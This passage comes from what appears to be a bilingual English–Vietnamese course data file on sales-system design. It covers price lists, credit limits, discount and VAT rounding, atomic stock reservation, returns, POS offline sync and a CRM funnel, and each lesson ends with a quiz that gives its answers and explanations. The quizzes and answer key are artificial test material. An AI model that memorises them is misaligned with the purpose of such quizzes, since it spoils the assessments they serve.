VI: Một lần chuyển khoản có thể trả cho ba hóa đơn. Vì vậy hệ thống cần bảng liên kết giữa phiếu thu và hóa đơn.`,choices:["True","False"],answer:0,why:"It is a many-to-many link. A table like `PaymentAllocation` says how much of each payment goes to each invoice.\nVI: Đây là quan hệ nhiều-nhiều. Một bảng như `PaymentAllocation` ghi rõ mỗi khoản thu trả cho hóa đơn nào, bao nhiêu tiền."}]},{id:"sales.customers-prices",title:"Customers and price lists · Khách hàng và bảng giá",summary:`Who buys, on what terms, and at which price.
VI: Ai mua, với điều kiện gì và theo giá nào.`,minutes:4,blocks:[{type:"text",text:`The **customer master** (danh mục khách hàng) holds data that every order reuses. Key fields are the tax code, credit limit and payment terms.
VI: **Danh mục khách hàng** chứa dữ liệu mà mọi đơn hàng dùng lại. Các trường chính là mã số thuế, hạn mức công nợ và thời hạn thanh toán.`},{type:"diagram",text:`Customer C-001  Minh Anh Store
┌──────────────────┬───────────────────┐
│ Tax code (MST)   │ 0123456789        │
│ Group            │ Wholesale (sỉ)    │
│ Credit limit     │ 50,000,000 VND    │
│ Payment terms    │ 30 days           │
│ Owed now         │ 42,000,000 VND    │
└──────────────────┴───────────────────┘`},{type:"text",text:`The **credit limit** (hạn mức công nợ) is the most a customer may owe. Before confirming, check: owed now + new order ≤ limit. Here 42M + 10M = 52M, which is over 50M.
VI: **Hạn mức công nợ** là số tiền tối đa khách được nợ. Trước khi xác nhận đơn, kiểm tra: nợ hiện tại + đơn mới ≤ hạn mức. Ở đây 42 triệu + 10 triệu = 52 triệu, vượt 50 triệu.`},{type:"text",text:`A **price list** (bảng giá) has items, prices, a valid-from date and a valid-to date. It can be for everyone, for one customer group, or for one customer.
VI: **Bảng giá** gồm mặt hàng, giá, ngày bắt đầu và ngày kết thúc hiệu lực. Nó có thể áp dụng cho mọi khách, một nhóm khách, hoặc một khách cụ thể.`},{type:"diagram",text:`Find price: item MILK-1L, date 15/03
 1. Customer price list  valid? → use it
 2. Group price list     valid? → use it
 3. Default price list   valid? → use it
 4. None of them               → block it
(one common rule; confirm it with sales)`},{type:"example",title:"The Tết price list",text:`A Tết price list is valid from 01/01 to 31/01. An order comes in on 31/01 at 23:30. Is "to 31/01" inclusive? Which time zone counts? Ask before you code it.
VI: Bảng giá Tết có hiệu lực từ 01/01 đến 31/01. Một đơn đến lúc 23:30 ngày 31/01. "Đến 31/01" có tính cả ngày 31 không? Theo múi giờ nào? Hãy hỏi trước khi code.`},{type:"code",code:{lang:"sql",text:`INSERT INTO SalesOrderLine
  (OrderId, ItemId, Qty, UnitPrice, PriceListId)
VALUES (@orderId, @itemId, 10, 25000, 7);
-- UnitPrice is a copy, frozen at order time.
-- Never JOIN the price list later to show it.`}},{type:"text",text:`Save the price on the order line. Price lists change. The order is an agreement at the old price.
VI: Hãy lưu giá vào dòng đơn hàng. Bảng giá sẽ thay đổi. Còn đơn hàng là thỏa thuận theo giá tại thời điểm đặt.`},{type:"list",items:[`Two lists overlap for the same customer. Which one wins?
VI: Hai bảng giá chồng ngày cho cùng một khách. Bảng nào được ưu tiên?`,`Over the credit limit: block, warn, or ask a manager to approve?
VI: Vượt hạn mức công nợ: chặn, cảnh báo, hay cần quản lý duyệt?`,`Are list prices with VAT or without VAT?
VI: Giá trong bảng giá đã gồm thuế GTGT hay chưa?`]}],remember:`Pick the price once, save it on the order line, and never re-read it later.
VI: Chọn giá một lần, lưu vào dòng đơn hàng, và không bao giờ đọc lại từ bảng giá sau đó.`,questions:[{id:"sales.customers-prices.1",kind:"debug",difficulty:"medium",prompt:`In March, staff reprint a January invoice. It now shows March prices and a new total. What is the most likely cause?
VI: Tháng 3, nhân viên in lại hóa đơn tháng 1. Hóa đơn hiện giá tháng 3 và tổng tiền mới. Nguyên nhân khả năng cao nhất là gì?`,choices:["The printer driver caches an old template with new data","The January invoice was deleted and created again in March","The VAT rate in the system was changed during February","The print report joins the current price list for prices"],answer:3,why:"The report reads today's price list, not the saved line price. Documents must show the `UnitPrice` stored on the line.\nVI: Báo cáo đọc bảng giá hiện tại thay vì giá đã lưu trên dòng. Chứng từ phải hiển thị `UnitPrice` đã lưu trên dòng đơn."},{id:"sales.customers-prices.2",kind:"scenario",difficulty:"medium",prompt:`A customer owes 42,000,000. Their credit limit is 50,000,000. They place a new order of 10,000,000. What should the check say?
VI: Khách đang nợ 42.000.000. Hạn mức là 50.000.000. Khách đặt đơn mới 10.000.000. Bước kiểm tra nên trả về gì?`,choices:["OK, because 10M on its own is under the 50M limit","Over limit, because 42M plus 10M is 52M, above 50M","OK, because the limit only counts debt that is overdue","Over limit, because any customer with debt is blocked"],answer:1,why:`The limit is about total debt, so add the new order to what is owed now. What happens next (block or approval) is a business rule to confirm.
VI: Hạn mức tính trên tổng nợ, nên phải cộng đơn mới vào số đang nợ. Bước tiếp theo (chặn hay xin duyệt) là quy tắc cần xác nhận với nghiệp vụ.`},{id:"sales.customers-prices.3",kind:"scenario",difficulty:"hard",prompt:`Two price lists for the "Wholesale" group are both valid on 1–5 March. They have different prices for the same item. What should the developer do?
VI: Hai bảng giá của nhóm "Bán sỉ" cùng hiệu lực từ 1–5/3, giá khác nhau cho cùng một mặt hàng. Lập trình viên nên làm gì?`,choices:["Use the lower price, because customers will not complain","Use whichever list the database happens to return first","Ask for the rule, and block overlaps when a list is saved","Use the higher price, because it protects the company profit"],answer:2,why:`Picking silently gives random or unfair prices. Get the rule from the business, then stop the overlap at save time.
VI: Tự chọn âm thầm sẽ cho ra giá ngẫu nhiên hoặc sai. Hãy hỏi quy tắc từ nghiệp vụ, rồi chặn việc chồng ngày ngay khi lưu bảng giá.`},{id:"sales.customers-prices.4",kind:"truefalse",difficulty:"easy",prompt:"After an order is confirmed, its line prices should come from the saved `UnitPrice`, not from the current price list.\nVI: Sau khi đơn đã xác nhận, giá trên dòng phải lấy từ `UnitPrice` đã lưu, không lấy từ bảng giá hiện tại.",choices:["True","False"],answer:0,why:`The order is an agreement made at a point in time. If prices must change, that is a clear action by a person, not a side effect.
VI: Đơn hàng là thỏa thuận tại một thời điểm. Nếu cần đổi giá, đó phải là thao tác rõ ràng của người dùng, không phải tác dụng phụ.`}]},{id:"sales.discounts-tax",title:"Discounts, promotions and tax · Chiết khấu, khuyến mại và thuế",summary:`The order of calculation and rounding change the total.
VI: Thứ tự tính và cách làm tròn sẽ làm thay đổi tổng tiền.`,minutes:5,blocks:[{type:"text",text:`A **line discount** (chiết khấu dòng) reduces one item. An **order discount** (chiết khấu tổng đơn) reduces the whole order. A promotion like **buy X get Y** (mua X tặng Y) adds a free or cheaper item.
VI: **Chiết khấu dòng** giảm giá một mặt hàng. **Chiết khấu tổng đơn** giảm cả đơn. Khuyến mại kiểu **mua X tặng Y** thêm một món miễn phí hoặc giá rẻ hơn.`},{type:"diagram",text:`Price × Qty       2 × 150,000 = 300,000
  ▼
Line discount 10%     −30,000 = 270,000
  ▼
Order voucher         −20,000 = 250,000
  ▼
VAT 10% (example)     +25,000 = 275,000`},{type:"text",text:`With a fixed amount voucher, the order matters. Take 300,000, a 50,000 voucher and 10% VAT. Voucher before VAT gives 275,000. Voucher after VAT gives 280,000.
VI: Với voucher giảm số tiền cố định, thứ tự rất quan trọng. Lấy 300.000, voucher 50.000 và VAT 10%. Trừ voucher trước VAT ra 275.000. Trừ sau VAT ra 280.000.`},{type:"text",text:`VND has no decimals, but VAT can give .5. You can round each line, or round the total once. The results can differ.
VI: Tiền VND không có số lẻ, nhưng thuế có thể ra .5. Có thể làm tròn từng dòng hoặc làm tròn một lần trên tổng. Kết quả có thể khác nhau.`},{type:"diagram",text:`3 lines × 10,005 VND, VAT 10% (example)
Rule: round half up
┌──────┬────────┬──────────┬─────────┐
│ Line │ Amount │ VAT exact│ Rounded │
├──────┼────────┼──────────┼─────────┤
│ 1    │ 10,005 │ 1,000.5  │ 1,001   │
│ 2    │ 10,005 │ 1,000.5  │ 1,001   │
│ 3    │ 10,005 │ 1,000.5  │ 1,001   │
├──────┴────────┴──────────┼─────────┤
│ Round per line: sum      │ 3,003   │
│ Round per total: 3,001.5 │ 3,002   │
└──────────────────────────┴─────────┘`},{type:"example",title:"One dong apart",text:`The POS rounds VAT per line. The e-invoice tool rounds per total. The receipt says 33,018 and the invoice says 33,017. The accountant now has a mismatch to explain.
VI: Máy POS làm tròn thuế theo từng dòng. Phần mềm hóa đơn điện tử làm tròn theo tổng. Phiếu in ra 33.018, hóa đơn ghi 33.017. Kế toán phải giải trình chênh lệch.`},{type:"code",code:{lang:"ts",text:`// Keep VND as whole numbers.
// Integer math first, round once, by one rule.
function vatOf(amount: number, ratePct: number) {
  return Math.round((amount * ratePct) / 100);
}
vatOf(10005, 10); // 100050 / 100 = 1000.5 → 1001`}},{type:"list",items:[`Can a voucher be used together with a line discount?
VI: Voucher có được dùng chung với chiết khấu dòng không?`,`If two discounts stack, which one is applied first?
VI: Nếu cộng dồn hai chiết khấu, cái nào áp dụng trước?`,`Is there a maximum total discount per order?
VI: Có giới hạn tổng chiết khấu tối đa cho một đơn không?`,`How must free items appear on the invoice? Ask the accountant.
VI: Hàng tặng phải thể hiện trên hóa đơn thế nào? Hãy hỏi kế toán.`]}],remember:`Write down the calculation order and the rounding rule, then use the same code everywhere.
VI: Ghi rõ thứ tự tính và quy tắc làm tròn, rồi dùng cùng một đoạn code ở mọi nơi.`,questions:[{id:"sales.discounts-tax.1",kind:"code",difficulty:"medium",prompt:`Subtotal 300,000. Voucher 50,000. VAT 10% (example). What do A and B give?
VI: Tạm tính 300.000. Voucher 50.000. VAT 10% (ví dụ). A và B cho ra bao nhiêu?`,code:{lang:"ts",text:`const a = (300000 - 50000) * 1.1;
const b = 300000 * 1.1 - 50000;`},choices:["a = 275,000, b = 280,000","a = 280,000, b = 275,000","Both are 275,000","Both are 280,000"],answer:0,why:`A takes the voucher off before VAT: 250,000 × 1.1. B adds VAT first: 330,000 − 50,000. The business must say which one is correct.
VI: A trừ voucher trước VAT: 250.000 × 1,1. B cộng VAT trước: 330.000 − 50.000. Nghiệp vụ phải quyết định cách nào đúng.`},{id:"sales.discounts-tax.2",kind:"scenario",difficulty:"medium",prompt:`Marketing says: "10% off, plus a 50,000 voucher." The order is 300,000. The code gives 220,000. Finance expected 225,000. What went wrong?
VI: Marketing nói: "Giảm 10%, cộng voucher 50.000." Đơn 300.000. Code tính ra 220.000. Tài chính mong 225.000. Sai ở đâu?`,choices:["The 10% was taken from the price including VAT","The order of the two discounts was never agreed on","JavaScript rounded the numbers in the wrong way","The voucher must always be applied after the VAT"],answer:1,why:`10% first: 270,000 − 50,000 = 220,000. Voucher first: 250,000 × 90% = 225,000. Stacking order is a business rule to confirm.
VI: Giảm 10% trước: 270.000 − 50.000 = 220.000. Trừ voucher trước: 250.000 × 90% = 225.000. Thứ tự cộng dồn là quy tắc nghiệp vụ cần xác nhận.`},{id:"sales.discounts-tax.3",kind:"compare",difficulty:"hard",prompt:`The POS, the website and the e-invoice tool all calculate VAT. Which approach is better?
VI: Máy POS, website và phần mềm hóa đơn điện tử đều tính VAT. Cách nào tốt hơn?`,choices:["Each system rounds in its own way, since the gap is only 1 VND","One rounding rule, agreed with accounting, used by every system"],answer:1,why:`Small gaps still break the match between receipt, invoice and books. One shared rule (or one shared service) avoids that.
VI: Chênh lệch nhỏ vẫn làm phiếu thu, hóa đơn và sổ sách không khớp. Một quy tắc chung (hoặc một service dùng chung) sẽ tránh được việc này.`},{id:"sales.discounts-tax.4",kind:"truefalse",difficulty:"easy",prompt:`Promotion "buy 2 get 1 free": the free item also leaves the warehouse, so stock must go down by 3.
VI: Khuyến mại "mua 2 tặng 1": món tặng cũng ra khỏi kho, nên tồn kho phải giảm 3.`,choices:["True","False"],answer:0,why:`Free for the customer does not mean free for the warehouse. The free item needs its own line with quantity, even at price 0.
VI: Miễn phí với khách không có nghĩa là kho không mất hàng. Món tặng cần một dòng riêng có số lượng, kể cả khi giá bằng 0.`}]},{id:"sales.reservation",title:"Stock reservation and backorders · Giữ hàng và đơn chờ hàng",summary:`Do not sell the same item twice.
VI: Đừng bán một món hàng cho hai người.`,minutes:4,blocks:[{type:"text",text:`When an order is confirmed, the system can **reserve** (giữ) its stock. Reserved stock is still in the warehouse, but no one else can sell it.
VI: Khi đơn được xác nhận, hệ thống có thể **giữ hàng** cho đơn đó. Hàng đã giữ vẫn nằm trong kho, nhưng không ai khác được bán.`},{type:"diagram",text:`Item: Rice 5kg
On hand  (tồn thực tế)           100
Reserved (đã giữ cho đơn)        −70
────────────────────────────────────
Available to promise              30
(có thể bán thêm)`},{type:"text",text:`**Available to promise** (ATP) tells sales what they can still promise. In its simple form it is on hand minus reserved. Some systems also add stock that will arrive soon.
VI: **Available to promise** (ATP) cho biết còn bao nhiêu hàng có thể hứa bán. Dạng đơn giản là tồn thực tế trừ hàng đã giữ. Một số hệ thống cộng thêm hàng sắp về.`},{type:"diagram",text:`Flash sale: 1 phone left
Time  Buyer A          Buyer B
t1    read avail = 1
t2                     read avail = 1
t3    reserve → OK
t4                     reserve → OK
Result: 2 orders, 1 phone → oversold`},{type:"code",code:{lang:"sql",text:`UPDATE Stock
SET Reserved = Reserved + @qty
WHERE ItemId = @itemId
  AND OnHand - Reserved >= @qty;
-- 0 rows updated → not enough stock.
-- Check and change happen in one statement.`}},{type:"example",title:"A 9.9 flash sale",text:`An online shop sells 500 phones at a big discount. Thousands of buyers press "Buy" in the same second. If the check and the update are two steps, it sells more than 500. Then it must cancel orders and gets angry reviews.
VI: Một shop online bán 500 điện thoại giảm giá sâu. Hàng nghìn người bấm "Mua" cùng một giây. Nếu kiểm tra và cập nhật là hai bước tách rời, shop sẽ bán quá 500. Sau đó phải hủy đơn và bị đánh giá xấu.`},{type:"text",text:`A **backorder** (đơn chờ hàng) is an order the customer still wants, but stock is short. It waits until new goods arrive. It is not cancelled.
VI: **Backorder** (đơn chờ hàng) là đơn khách vẫn muốn mua nhưng kho đang thiếu. Đơn chờ đến khi hàng mới về, không bị hủy.`},{type:"list",items:[`When do we reserve: at cart, at checkout, at payment, or at confirm?
VI: Giữ hàng lúc nào: khi thêm vào giỏ, khi đặt, khi thanh toán, hay khi xác nhận?`,`How long does a reservation last if the order is not paid?
VI: Hàng được giữ bao lâu nếu đơn chưa thanh toán?`,`When new stock arrives, which backorder gets it first?
VI: Khi hàng mới về, đơn chờ nào được nhận trước?`,`Ship part now, or wait and ship everything together?
VI: Giao một phần trước, hay chờ đủ rồi giao một lần?`]}],remember:`Available = on hand − reserved. Check and reserve in one atomic step.
VI: Có thể bán = tồn thực tế − đã giữ. Kiểm tra và giữ hàng phải nằm trong một bước duy nhất.`,questions:[{id:"sales.reservation.1",kind:"mcq",difficulty:"easy",prompt:`On hand is 100. Reserved is 70. A new order wants 40. What is true?
VI: Tồn thực tế 100. Đã giữ 70. Một đơn mới cần 40. Điều nào đúng?`,choices:["Only 30 are available, so 40 cannot all be reserved","100 are on hand, so the order of 40 can be reserved","70 are available, so the order of 40 can be reserved","Nothing is available until the 70 are delivered"],answer:0,why:`Available = 100 − 70 = 30. The other 70 already belong to other orders. The business decides: reserve 30 and backorder 10, or refuse.
VI: Có thể bán = 100 − 70 = 30. 70 kia đã thuộc về đơn khác. Nghiệp vụ quyết định: giữ 30 và chờ 10, hay từ chối đơn.`},{id:"sales.reservation.2",kind:"debug",difficulty:"medium",prompt:"A flash sale had 500 units. The system accepted 512 orders. The code first reads `available`, then runs a separate `UPDATE`. What is the cause?\nVI: Đợt flash sale có 500 sản phẩm. Hệ thống nhận 512 đơn. Code đọc `available` trước, rồi chạy `UPDATE` riêng. Nguyên nhân là gì?",choices:["The database lost 12 updates because the disk was too slow","The cache showed an old number of units for a few minutes","A race: many requests read the same number before any update","Twelve buyers clicked twice and the clicks were not merged"],answer:2,why:'Between the read and the update, other requests also read "enough stock". Put the check inside the `UPDATE ... WHERE` so it is one atomic step.\nVI: Giữa lúc đọc và lúc cập nhật, các request khác cũng đọc thấy "còn đủ hàng". Hãy đưa điều kiện vào `UPDATE ... WHERE` để thành một bước nguyên tử.'},{id:"sales.reservation.3",kind:"code",difficulty:"hard",prompt:"One unit is left. Two requests run this at the same moment, with `@qty = 1`. What happens in SQL Server?\nVI: Còn 1 sản phẩm. Hai request chạy câu này cùng lúc, `@qty = 1`. Điều gì xảy ra trong SQL Server?",code:{lang:"sql",text:`UPDATE Stock
SET Reserved = Reserved + @qty
WHERE ItemId = @itemId
  AND OnHand - Reserved >= @qty;`},choices:["Both update 1 row, so the item is reserved twice","One updates 1 row; the other waits, then updates 0","Both fail with a deadlock error and nothing is saved","Both update 0 rows, because each sees the other one"],answer:1,why:`The first update locks the row. The second waits, then checks the condition again on the new value and finds 0 rows. Your code must check rows affected.
VI: Câu update đầu khóa dòng. Câu thứ hai chờ, rồi kiểm tra lại điều kiện trên giá trị mới và không cập nhật dòng nào. Code phải kiểm tra số dòng bị ảnh hưởng.`},{id:"sales.reservation.4",kind:"scenario",difficulty:"medium",prompt:`The website says "sold out". The warehouse still has 200 units. Many unpaid online orders reserved stock weeks ago. What is the best fix?
VI: Website báo "hết hàng" nhưng kho còn 200 sản phẩm. Nhiều đơn online chưa thanh toán đã giữ hàng từ vài tuần trước. Cách sửa nào tốt nhất?`,choices:["Turn off reservations so every order takes stock freely","Ask the warehouse to count the 200 units again by hand","Show stock on hand on the website instead of available","Agree a reservation time limit, and release expired holds"],answer:3,why:`Holds without an end date lock stock forever. A time limit plus a release job frees it. Turning reservations off brings back overselling.
VI: Giữ hàng không có hạn sẽ khóa tồn kho mãi mãi. Đặt thời hạn và có job giải phóng sẽ trả hàng lại. Tắt giữ hàng thì lại bị bán vượt tồn.`}]},{id:"sales.returns",title:"Returns and refunds · Trả hàng và hoàn tiền",summary:`Goods come back, money goes back, stock is checked.
VI: Hàng quay về, tiền hoàn lại, tồn kho được kiểm tra.`,minutes:4,blocks:[{type:"text",text:`A **return order** (đơn trả hàng) always links to the original order line. It is not a free "negative sale". The link tells you the price paid and the quantity delivered.
VI: **Đơn trả hàng** luôn liên kết với dòng của đơn gốc. Nó không phải một "đơn bán âm" tự do. Liên kết này cho biết giá đã trả và số lượng đã giao.`},{type:"diagram",text:`Customer returns 2 items
        ▼
Return order (đơn trả hàng)
  → links to SO-101, line 1
        ▼
Goods received and checked
   ┌────┴──────┐
   ▼           ▼
Restock      Scrap
(nhập lại)   (hàng hỏng, hủy)
   └────┬──────┘
        ▼
Credit note (hóa đơn điều chỉnh)
        ▼
Refund: cash, bank, card, store credit`},{type:"text",text:`A **credit note** reduces what the customer owes. In Vietnam, e-invoice returns often use an **adjustment invoice** (hóa đơn điều chỉnh). Ask the accountant which document the law needs.
VI: **Credit note** làm giảm số tiền khách nợ. Ở Việt Nam, trả hàng có hóa đơn điện tử thường dùng **hóa đơn điều chỉnh**. Hãy hỏi kế toán chứng từ nào đúng quy định.`},{type:"text",text:`Refund the price the customer really paid on that line, after discounts. Do not use today's price.
VI: Hoàn số tiền khách thực trả trên dòng đó, sau chiết khấu. Không dùng giá hôm nay.`},{type:"example",title:"Buy 2 get 1, then return 1",text:`A customer buys 3 shirts with "buy 2 get 1 free". They pay 400,000. Then they return one shirt. Refund 200,000? Then they keep 2 shirts for 200,000. The business must decide how to split the promotion.
VI: Khách mua 3 áo theo chương trình "mua 2 tặng 1", trả 400.000. Sau đó khách trả lại 1 áo. Hoàn 200.000 ư? Vậy khách giữ 2 áo chỉ với 200.000. Nghiệp vụ phải quyết định cách chia giá trị khuyến mại.`},{type:"code",code:{lang:"text",text:`ReturnOrder(Id, OriginalOrderId, Reason,
  Status, CreatedAt)
ReturnLine(Id, ReturnId, OrderLineId, Qty,
  RefundUnitPrice, Condition)
  -- Condition: Restock | Scrap
CreditNote(Id, ReturnId, InvoiceId, Amount)
Refund(Id, CreditNoteId, Method, Amount)`}},{type:"list",items:[`Rule: returned qty ≤ delivered qty − already returned qty.
VI: Quy tắc: số lượng trả ≤ số đã giao − số đã trả trước đó.`,`Return window, for example 7 days: from order date or delivery date?
VI: Thời hạn trả hàng, ví dụ 7 ngày: tính từ ngày đặt hay ngày giao?`,`Refund method: same as the original payment, or store credit?
VI: Hoàn tiền theo cách nào: giống cách khách đã trả, hay đổi thành điểm/số dư?`,`Who checks the goods, and who decides restock or scrap?
VI: Ai kiểm tra hàng, ai quyết định nhập lại kho hay hủy?`]}],remember:`A return links to the original line: refund what was paid, and only up to what was delivered.
VI: Đơn trả hàng gắn với dòng gốc: hoàn đúng số đã trả, và không vượt quá số đã giao.`,questions:[{id:"sales.returns.1",kind:"debug",difficulty:"medium",prompt:`A customer bought 2 items. A double click created three returns of 2 each. Stock went up by 6. What check is missing?
VI: Khách mua 2 món. Một lần bấm đúp tạo ra ba đơn trả, mỗi đơn 2 món. Tồn kho tăng 6. Thiếu bước kiểm tra nào?`,choices:["The return reason field must not be left empty","Each return must be approved by a store manager","Returned qty must not exceed delivered minus returned","Stock must be counted by hand after each return"],answer:2,why:`The system must track how much of each line is already returned. Without that rule, one sale can be refunded many times.
VI: Hệ thống phải theo dõi mỗi dòng đã trả bao nhiêu. Thiếu quy tắc này, một lần bán có thể bị hoàn tiền nhiều lần.`},{id:"sales.returns.2",kind:"scenario",difficulty:"hard",prompt:`"Buy 2 get 1 free": the customer paid 400,000 for 3 shirts and returns 1. The spec says nothing about this. What should the developer do?
VI: "Mua 2 tặng 1": khách trả 400.000 cho 3 áo và trả lại 1 áo. Đặc tả không nói gì về trường hợp này. Lập trình viên nên làm gì?`,choices:["Refund 200,000, the normal price of one shirt","Refund 0, and say the returned shirt was the free one","Ask the business how promotion value splits on a return","Refund 133,333, since that is the fair average price"],answer:2,why:`Each option is a real policy with a different money result. The developer must not pick one silently. Ask, then write it down as a rule and a test.
VI: Mỗi lựa chọn là một chính sách thật với số tiền khác nhau. Lập trình viên không được tự chọn. Hãy hỏi, rồi ghi lại thành quy tắc và test.`},{id:"sales.returns.3",kind:"mcq",difficulty:"easy",prompt:`A returned kettle is broken. What should happen to stock?
VI: Một ấm đun nước bị trả về đã hỏng. Tồn kho nên xử lý thế nào?`,choices:["Add it to sellable stock, since it came back","Do not add it to sellable stock; mark it as scrap","Add it to sellable stock, then fix the count later","Ignore it, because returns never affect stock"],answer:1,why:`Only goods in good condition go back to available stock. Broken goods go to a scrap or damaged location, so no one sells them again.
VI: Chỉ hàng còn tốt mới quay lại tồn có thể bán. Hàng hỏng chuyển sang kho hàng hỏng hoặc hủy, để không bị bán lại.`},{id:"sales.returns.4",kind:"truefalse",difficulty:"medium",prompt:`The refund amount should be based on today's price list.
VI: Số tiền hoàn nên tính theo bảng giá hôm nay.`,choices:["True","False"],answer:1,why:`The customer paid the price saved on the original line, after discounts. Refund that amount, not the current price.
VI: Khách đã trả theo giá lưu trên dòng gốc, sau chiết khấu. Hãy hoàn đúng số đó, không theo giá hiện tại.`}]},{id:"sales.shops-online",title:"Shops and e-commerce · Cửa hàng và bán hàng online",summary:`POS in the shop, carts online, one stock for all channels.
VI: POS tại cửa hàng, giỏ hàng trên mạng, một tồn kho chung cho mọi kênh.`,minutes:5,blocks:[{type:"text",text:`A **POS** (point of sale, máy bán hàng tại quầy) is the cashier app. It scans items, takes payment and prints a receipt.
VI: **POS** (máy bán hàng tại quầy) là phần mềm của thu ngân. Nó quét mã hàng, nhận thanh toán và in hóa đơn bán lẻ.`},{type:"diagram",text:`Shift close (chốt ca) – cash drawer
Opening cash (tiền đầu ca)     500,000
+ Cash sales                 3,200,000
− Cash refunds                 150,000
──────────────────────────────────────
Expected in drawer           3,550,000
Counted by cashier           3,500,000
Difference (chênh lệch)        −50,000`},{type:"text",text:`At **shift close** (chốt ca), the cashier counts the cash drawer. The system compares it with the expected amount. A manager reviews any difference.
VI: Khi **chốt ca**, thu ngân đếm tiền trong két. Hệ thống so với số tiền dự kiến. Quản lý xem xét mọi khoản chênh lệch.`},{type:"text",text:`In **offline mode**, the internet is down but the POS keeps selling. It saves sales on the device and sends them later. Each sale needs an id made on the device, so a resend does not create a copy.
VI: Ở **chế độ offline**, mất mạng nhưng POS vẫn bán được. Nó lưu giao dịch trên máy và gửi sau. Mỗi giao dịch cần mã tạo ngay trên máy, để gửi lại không bị trùng.`},{type:"code",code:{lang:"ts",text:`// Server side. Sales.Id also has a UNIQUE key.
async function syncSale(sale: Sale) {
  const found = await db.sales.find(sale.id);
  if (found) return; // already synced: skip
  await db.sales.insert(sale);
}`}},{type:"text",text:`Online, a customer fills a **cart** (giỏ hàng), then goes to **checkout** (thanh toán). Many carts are never paid. These are **abandoned carts** (giỏ hàng bỏ dở). Shops often send a reminder.
VI: Trên mạng, khách bỏ hàng vào **giỏ**, rồi **thanh toán**. Nhiều giỏ không bao giờ được trả tiền. Đó là **giỏ hàng bỏ dở**. Shop thường gửi tin nhắc khách.`},{type:"diagram",text:`       ┌──────────────────┐
       │ One stock        │
       │ (tồn kho chung)  │
       └────────┬─────────┘
   ┌───────┬────┴───┬──────────┐
   ▼       ▼        ▼          ▼
 Shop   Website  Shopee   TikTok Shop
   │       │        │          │
   └───────┴────────┴──────────┘
  every sale updates the one stock`},{type:"example",title:"Five bags, two channels",text:`A shop has 5 bags. It sells 3 in the store at 10:00. Stock syncs to the marketplace every 15 minutes. Meanwhile the marketplace still shows 5, and 4 online orders arrive. Now 2 bags are oversold.
VI: Shop có 5 túi. Lúc 10:00 bán 3 túi tại cửa hàng. Tồn kho đồng bộ lên sàn mỗi 15 phút. Trong lúc đó sàn vẫn hiện 5, và có 4 đơn online. Thế là bán vượt 2 túi.`},{type:"list",items:[`Which payment methods are allowed while offline?
VI: Khi mất mạng, cho phép những hình thức thanh toán nào?`,`Who approves a cash difference at shift close?
VI: Ai duyệt khoản chênh lệch tiền khi chốt ca?`,`Show all stock on each marketplace, or keep a buffer?
VI: Hiện toàn bộ tồn kho lên mỗi sàn, hay giữ lại một phần dự phòng?`]}],remember:`One stock number is the truth. Every channel reads from it, and every sale updates it fast.
VI: Chỉ có một con số tồn kho là chuẩn. Mọi kênh đọc từ nó, và mọi lần bán phải cập nhật nó thật nhanh.`,questions:[{id:"sales.shops-online.1",kind:"mcq",difficulty:"easy",prompt:`Opening cash 1,000,000. Cash sales 5,000,000. Cash refunds 200,000. The cashier counts 5,700,000. What is the difference?
VI: Tiền đầu ca 1.000.000. Bán tiền mặt 5.000.000. Hoàn tiền mặt 200.000. Thu ngân đếm được 5.700.000. Chênh lệch là bao nhiêu?`,choices:["−100,000 (short)","+100,000 (over)","−300,000 (short)","0 (it matches)"],answer:0,why:`Expected = 1,000,000 + 5,000,000 − 200,000 = 5,800,000. Counted 5,700,000, so the drawer is 100,000 short.
VI: Dự kiến = 1.000.000 + 5.000.000 − 200.000 = 5.800.000. Đếm được 5.700.000, vậy két thiếu 100.000.`},{id:"sales.shops-online.2",kind:"debug",difficulty:"medium",prompt:`The internet came back after 2 hours. Some offline POS sales now appear twice on the server. What is the most likely cause?
VI: Có mạng lại sau 2 giờ. Một số giao dịch offline của POS bị ghi hai lần trên server. Nguyên nhân khả năng cao nhất là gì?`,choices:["The cashier scanned each item twice while the POS was offline","The server makes a new id per upload, so resends become copies","The device clock was wrong, so the sales got the same time","The database cannot store sales made while it was offline"],answer:1,why:`A sync often retries after a timeout. If the sale id comes from the device and is unique on the server, a retry is skipped safely.
VI: Đồng bộ thường gửi lại khi bị timeout. Nếu mã giao dịch tạo trên máy và là duy nhất trên server, lần gửi lại sẽ được bỏ qua an toàn.`},{id:"sales.shops-online.3",kind:"scenario",difficulty:"hard",prompt:`A shop sells in store and on two marketplaces. Stock syncs every 15 minutes, and popular items get oversold. What is the best fix?
VI: Shop bán tại cửa hàng và trên hai sàn. Tồn kho đồng bộ mỗi 15 phút, hàng bán chạy bị bán vượt. Cách sửa nào tốt nhất?`,choices:["Sync every 5 minutes instead, and keep the rest of the process","Give each channel its own stock count and never move items between","Push stock on every sale, and keep a small buffer on marketplaces","Ask staff to check the marketplaces by hand every hour"],answer:2,why:`Updating on each sale makes the gap small. A buffer covers the delay that still exists. Faster polling only makes the gap smaller, not gone.
VI: Cập nhật ngay mỗi lần bán giúp khoảng trễ rất nhỏ. Tồn dự phòng che phần trễ còn lại. Đồng bộ nhanh hơn chỉ làm khoảng trễ ngắn lại, không hết.`},{id:"sales.shops-online.4",kind:"truefalse",difficulty:"easy",prompt:`Adding an item to an online cart should always reserve stock until the cart is paid.
VI: Thêm hàng vào giỏ online luôn phải giữ hàng cho đến khi giỏ được thanh toán.`,choices:["True","False"],answer:1,why:`Many carts are abandoned. Holding stock for them blocks real buyers. Shops usually reserve at checkout or payment, with a time limit.
VI: Nhiều giỏ hàng bị bỏ dở. Giữ hàng cho chúng sẽ chặn người mua thật. Shop thường giữ hàng khi đặt đơn hoặc thanh toán, có giới hạn thời gian.`}]},{id:"sales.crm-pipeline",title:"CRM and the sales pipeline · CRM và phễu bán hàng",summary:`Track people before they buy, and measure the funnel.
VI: Theo dõi khách trước khi họ mua, và đo lường phễu bán hàng.`,minutes:4,blocks:[{type:"text",text:`**CRM** (customer relationship management) tracks people before and after they buy. A **lead** is someone who may buy. An **opportunity** is a real deal with a value and an expected date.
VI: **CRM** (quản lý quan hệ khách hàng) theo dõi khách trước và sau khi mua. **Lead** là người có thể mua. **Cơ hội bán hàng** là một thương vụ thật, có giá trị và ngày dự kiến chốt.`},{type:"diagram",text:`Leads (khách tiềm năng)      1,000
   │  20% become
   ▼
Opportunities (cơ hội)         200
   │  40% get a quote
   ▼
Quotes (báo giá)                80
   ├──► Won (thắng)             20
   └──► Lost (thua)             60
Lead → won: 20 / 1,000 = 2%
